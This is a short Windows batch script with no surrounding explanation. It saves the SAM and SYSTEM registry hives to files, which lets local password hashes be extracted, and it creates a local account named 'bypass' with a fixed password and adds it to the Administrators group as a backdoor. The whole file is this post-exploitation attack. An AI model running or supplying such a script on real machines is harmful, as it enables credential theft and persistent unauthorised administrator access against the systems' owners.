@echo off
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
net user bypass Vuln2025+ /add
net localgroup administrators bypass /add